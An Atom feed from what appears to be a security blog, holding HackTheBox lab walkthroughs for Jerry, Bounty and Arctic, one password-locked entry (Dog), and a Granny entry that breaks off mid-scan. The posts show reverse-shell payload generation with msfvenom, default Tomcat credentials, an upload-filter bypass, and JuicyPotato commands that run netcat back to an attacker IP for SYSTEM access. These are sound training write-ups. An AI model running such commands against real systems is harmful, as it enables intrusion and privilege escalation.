<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mdn1nj4&#39;s Blog</title>
  
  
  <link href="https://mdn1nj4.github.io/atom.xml" rel="self"/>
  
  <link href="https://mdn1nj4.github.io/"/>
  <updated>2025-05-08T09:25:41.091Z</updated>
  <id>https://mdn1nj4.github.io/</id>
  
  <author>
    <name>mdn1nj4</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox - Dog Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-dog-walkthrough/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-dog-walkthrough/</id>
    <published>2025-05-07T13:00:00.000Z</published>
    <updated>2025-05-08T09:25:41.091Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="84b69abd66cef684dd9a03b46bf71498fd4147ec3493607529b0dd53c016ff9e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Submit the password of user "johncusack"</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">HackTheBox&#39;s dog is an easy level linux machine.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="rce" scheme="https://mdn1nj4.github.io/tags/rce/"/>
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
    <category term="web" scheme="https://mdn1nj4.github.io/tags/web/"/>
    
    <category term="git" scheme="https://mdn1nj4.github.io/tags/git/"/>
    
    <category term="cve" scheme="https://mdn1nj4.github.io/tags/cve/"/>
    
    <category term="sudo" scheme="https://mdn1nj4.github.io/tags/sudo/"/>
    
    <category term="backdrop" scheme="https://mdn1nj4.github.io/tags/backdrop/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Jerry Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-jerry-walkthrough/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-jerry-walkthrough/</id>
    <published>2023-09-13T18:30:00.000Z</published>
    <updated>2025-05-08T07:31:28.248Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Windows<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 0<br><strong>Release</strong>: 30 Jun, 2018<br><strong>IP</strong>: 10.10.10.95</p></blockquote><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-scan-result"><a href="#Nmap-scan-result" class="headerlink" title="Nmap scan result"></a>Nmap scan result</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.95</span><br><span class="line">Host is up (0.050s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">|_http-title: Apache Tomcat/7.0.88</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br></pre></td></tr></table></figure><p>Tomcat server is running on the port 8080.</p><h2 id="User-and-Root-Flag"><a href="#User-and-Root-Flag" class="headerlink" title="User and Root Flag"></a>User and Root Flag</h2><p>With the default usernames and passwords, we attempted to access the Tomcat manager page</p><p>We were able to gain access after some attempts using the username <strong>tomcat</strong> and the password <strong>s3cret</strong><br><img src="https://i.imgur.com/NfOjmVg.png" alt="img"><br>Obtaining reverse shell requires uploading the war reverse shell payload to the Tomcat server.</p><p>Metasploit command to create a war meterpreter shell.</p><p><code>msfvenom -p java/meterpreter/reverse_tcp lhost=10.10.14.xx lport=1111 -f war -o sh.war</code></p><p>When you upload the payload, you need to set up the listener before triggering the reverse in Tomcat.</p><p>I always use meterpreter shell for Windows machines, but you can upload a shell that is not meterpreter as well.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use multi/handler                                                 </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp                                                                </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload java/meterpreter/reverse_tcp                                             </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp                                                                            </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost tun0                                                                          </span><br><span class="line">lhost =&gt; tun0                                                                                                         </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 1111                                                                          </span><br><span class="line">lport =&gt; 1111                                                                                                         </span><br><span class="line">msf6 exploit(multi/handler) &gt; run                                                                                     </span><br><span class="line">                                                                                                                      </span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.xx:1111                                                                   </span><br><span class="line">[*] Sending stage (58829 bytes) to 10.10.10.95                                                                        </span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.xx:1111 -&gt; 10.10.10.95:49195)</span><br></pre></td></tr></table></figure><p>Then we got shell as “<strong>NT authority&#x2F;system</strong>“</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">apache</span>-<span class="title">tomcat</span>-7.0.88&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">apache</span>-<span class="title">tomcat</span>-7.0.88&gt;</span></span><br></pre></td></tr></table></figure><p>Got the user and root flag.</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">Desktop</span>\<span class="title">flags</span>&gt;<span class="title">type</span> &quot;2 <span class="title">for</span> <span class="title">the</span> <span class="title">price</span> <span class="title">of</span> 1.<span class="title">txt</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">type</span> &quot;2 <span class="title">for</span> <span class="title">the</span> <span class="title">price</span> <span class="title">of</span> 1.<span class="title">txt</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">user.txt</span></span></span><br><span class="line"><span class="function">7004<span class="title">dbcefxxxxxx</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">root.txt</span></span></span><br><span class="line"><span class="function">04<span class="title">a8b36e1xxxxxx</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">HackTheBox&#39;s jerry is an easy level windows machine.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="windows" scheme="https://mdn1nj4.github.io/tags/windows/"/>
    
    <category term="RCE" scheme="https://mdn1nj4.github.io/tags/RCE/"/>
    
    <category term="tomcat" scheme="https://mdn1nj4.github.io/tags/tomcat/"/>
    
    <category term="war" scheme="https://mdn1nj4.github.io/tags/war/"/>
    
    <category term="OSCP" scheme="https://mdn1nj4.github.io/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Bounty Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-bounty-walkthrough/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-bounty-walkthrough/</id>
    <published>2023-09-12T18:30:00.000Z</published>
    <updated>2025-05-08T07:31:28.246Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Windows<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 0<br><strong>Release</strong>: 16 Jun, 2018<br><strong>IP</strong>: 10.10.10.93</p></blockquote><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-scan-result"><a href="#Nmap-scan-result" class="headerlink" title="Nmap scan result"></a>Nmap scan result</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.93</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Bounty</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><p>After some enumuration we found nothing so we decided to run gobuster.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ gobuster <span class="built_in">dir</span> -u http://10.10.10.93/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x asp,aspx</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.93/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              asp,aspx</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/transfer.aspx        (Status: 200) [Size: 941]</span><br><span class="line">/*checkout*.aspx      (Status: 400) [Size: 11]</span><br><span class="line">/*docroot*.aspx       (Status: 400) [Size: 11]</span><br><span class="line">/*.aspx               (Status: 400) [Size: 11]</span><br><span class="line">/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]</span><br><span class="line">/http%3A.aspx         (Status: 400) [Size: 11]</span><br><span class="line">/UploadedFiles        (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/UploadedFiles/]</span><br><span class="line">/q%26a.aspx           (Status: 400) [Size: 11]</span><br><span class="line">/**http%3a.aspx       (Status: 400) [Size: 11]</span><br></pre></td></tr></table></figure><p>Founded paths</p><ul><li>&#x2F;transfer.aspx - Secure transfer upload functionality</li><li>&#x2F;UploadedFiles - Path where the uploaded files are stored</li></ul><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>we tried to upload aspx reverse shell but it failed based on the file extension check, so we have to bypass the  check so we changed the file extension from .aspx to .config</p><p>Reference: <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a></p><p>aspx files are not executed with the ,config extension then</p><p>i found the .config reverse shell file here <a href="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/web.exit">https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/web.exit</a></p><p>using above reverse shell we got shell as merlin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f user.txt</span><br><span class="line">Found 1 result...</span><br><span class="line">=================</span><br><span class="line">Path                              Size (bytes)  Modified (UTC)</span><br><span class="line">----                              ------------  --------------</span><br><span class="line">c:\Users\merlin\Desktop\user.txt  34            2023-09-13 08:33:05 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: BOUNTY\merlin</span><br></pre></td></tr></table></figure><p>Got the user flag.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>merlin user account has <strong>SeImpersonatePrivilege</strong> enabled</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>                               <span class="title">State</span>   </span></span><br><span class="line"><span class="function">============================= ========================================= ========</span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>       <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>                  <span class="title">Enabled</span> </span></span><br><span class="line"><span class="function"><span class="title">SeImpersonatePrivilege</span>        <span class="title">Impersonate</span> <span class="title">a</span> <span class="title">client</span> <span class="title">after</span> <span class="title">authentication</span> <span class="title">Enabled</span> </span></span><br><span class="line"><span class="function"><span class="title">SeCreateGlobalPrivilege</span>       <span class="title">Create</span> <span class="title">global</span> <span class="title">objects</span>                     <span class="title">Enabled</span> </span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span> <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span>            <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure><p>If <strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong> enabled in machine we use this for elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users.</p><p>To escalate to system, we are going to using the Juicy Potato: <a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p><p>Command used to get shell<br><code>JuicyPotato.exe -l 1337 -c &quot;&#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;&quot; -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\merlin\desktop\nc64.exe -e cmd.exe 10.10.1x.xx 1234&quot; -t *</code></p><p>After executing the above command we got the shell as <strong>nt authority\system</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">hostname</span></span></span><br><span class="line"><span class="function"><span class="title">bounty</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt;<span class="title">type</span> <span class="title">users</span>\<span class="title">administrator</span>\<span class="title">desktop</span>\<span class="title">root.txt</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">users</span>\<span class="title">administrator</span>\<span class="title">desktop</span>\<span class="title">root.txt</span></span></span><br><span class="line"><span class="function"><span class="title">f95efxxxxx</span>.......</span></span><br></pre></td></tr></table></figure><p>Got the root flag.</p>]]></content>
    
    
    <summary type="html">HackTheBox&#39;s Bounty is an easy level windows machine.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="windows" scheme="https://mdn1nj4.github.io/tags/windows/"/>
    
    <category term="asp" scheme="https://mdn1nj4.github.io/tags/asp/"/>
    
    <category term="fileupload" scheme="https://mdn1nj4.github.io/tags/fileupload/"/>
    
    <category term="SeImpersonatePrivilege" scheme="https://mdn1nj4.github.io/tags/SeImpersonatePrivilege/"/>
    
    <category term="RCE" scheme="https://mdn1nj4.github.io/tags/RCE/"/>
    
    <category term="Juicy Potato" scheme="https://mdn1nj4.github.io/tags/Juicy-Potato/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Arctic Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-arctic-walkthrough/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-arctic-walkthrough/</id>
    <published>2023-09-12T18:30:00.000Z</published>
    <updated>2025-05-08T07:31:28.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Windows<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 0<br><strong>Release</strong>: 22 Mar, 2017<br><strong>IP</strong>: 10.10.10.11</p></blockquote><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-scan-result"><a href="#Nmap-scan-result" class="headerlink" title="Nmap scan result"></a>Nmap scan result</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.11</span><br><span class="line">Host is up (0.055s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">135/tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">8500/tcp  open  fmtp?</span><br><span class="line">49154/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 142.31 seconds</span><br></pre></td></tr></table></figure><p>After we enumurate the 8500 port we found two folders</p><ul><li>CFIDE&#x2F;</li><li>cfdocs&#x2F;</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://10.10.10.11:8500 -i</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Date: Thu, 14 Sep 2023 17:32:02 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Server: JRun Web Server</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;Index of /&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=<span class="string">&quot;#ffffff&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;Index of /&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=<span class="string">&quot;CFIDE/&quot;</span>&gt;CFIDE/&lt;/a&gt;               &lt;i&gt;<span class="built_in">dir</span>&lt;/i&gt;   03/22/17 08:52 μμ</span><br><span class="line">&lt;a href=<span class="string">&quot;cfdocs/&quot;</span>&gt;cfdocs/&lt;/a&gt;              &lt;i&gt;<span class="built_in">dir</span>&lt;/i&gt;   03/22/17 08:55 μμ</span><br><span class="line">&lt;/pre&gt;&lt;hr&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>After some enumeration we found the Adobe ColdFusion 8 in the machine.<br><img src="https://i.imgur.com/leTTkxD.png" alt="img">Found the RCE exploit for the same version <a href="https://www.exploit-db.com/exploits/50057">https://www.exploit-db.com/exploits/50057</a><br>Using the exploit we got shell as tolis</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">arctic</span>\<span class="title">tolis</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt;<span class="title">dir</span> &quot;<span class="title">user.txt</span>&quot; /<span class="title">s</span></span></span><br><span class="line"><span class="function"><span class="title">dir</span> &quot;<span class="title">user.txt</span>&quot; /<span class="title">s</span></span></span><br><span class="line"><span class="function"> <span class="title">Volume</span> <span class="title">in</span> <span class="title">drive</span> <span class="title">C</span> <span class="title">has</span> <span class="title">no</span> <span class="title">label</span>.</span></span><br><span class="line"><span class="function"> <span class="title">Volume</span> <span class="title">Serial</span> <span class="title">Number</span> <span class="title">is</span> 5<span class="title">C03</span>-76<span class="title">A8</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Directory</span> <span class="title">of</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">tolis</span>\<span class="title">Desktop</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">14/09/2023  08:28                 34 <span class="title">user.txt</span></span></span><br><span class="line"><span class="function">               1 <span class="title">File</span>(<span class="title">s</span>)             34 <span class="title">bytes</span></span></span><br></pre></td></tr></table></figure><p>Got the user flag.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>tolis user account has <strong>SeImpersonatePrivilege</strong> enabled</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">whoami</span> /priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>            Disabled</span><br></pre></td></tr></table></figure><p>If <strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong> enabled, we can use this for elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users.</p><p>To escalate to system, we are going to using the Juicy Potato: <a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p><p>Command used to get shell<br><code>JuicyPotato.exe -l 1337 -c &quot;&#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;&quot; -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\tolis\desktop\nc64.exe -e cmd.exe 10.10.1x.xx 1234&quot; -t *</code><br>After executing the above command we got the shell as <strong>nt authority\system</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt;<span class="title">type</span> <span class="title">users</span>\<span class="title">administrator</span>\<span class="title">desktop</span>\<span class="title">root.txt</span></span></span><br><span class="line"><span class="function"><span class="title">dcf80b472exxxxx</span>.....</span></span><br></pre></td></tr></table></figure><p>Got the root flag.</p>]]></content>
    
    
    <summary type="html">HackTheBox&#39;s Arctic is an easy level windows machine.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="windows" scheme="https://mdn1nj4.github.io/tags/windows/"/>
    
    <category term="SeImpersonatePrivilege" scheme="https://mdn1nj4.github.io/tags/SeImpersonatePrivilege/"/>
    
    <category term="RCE" scheme="https://mdn1nj4.github.io/tags/RCE/"/>
    
    <category term="Juicy Potato" scheme="https://mdn1nj4.github.io/tags/Juicy-Potato/"/>
    
    <category term="coldfusion" scheme="https://mdn1nj4.github.io/tags/coldfusion/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Granny Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/HackTheBox-Granny-Walkthrough/"/>
    <id>https://mdn1nj4.github.io/htb/HackTheBox-Granny-Walkthrough/</id>
    <published>2023-09-11T18:30:00.000Z</published>
    <updated>2025-05-08T07:31:28.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Windows<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 0<br><strong>Release</strong>: 12 Apr, 2017<br><strong>IP</strong>: 10.10.10.15</p></blockquote><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-scan-result"><a href="#Nmap-scan-result" class="headerlink" title="Nmap scan result"></a>Nmap scan result</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.15</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 6.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">|_http-title: Under Construction</span><br><span class="line">| http-webdav-scan: </span><br><span class="line">|   WebDAV <span class="built_in">type</span>: Unknown</span><br><span class="line">|   Server 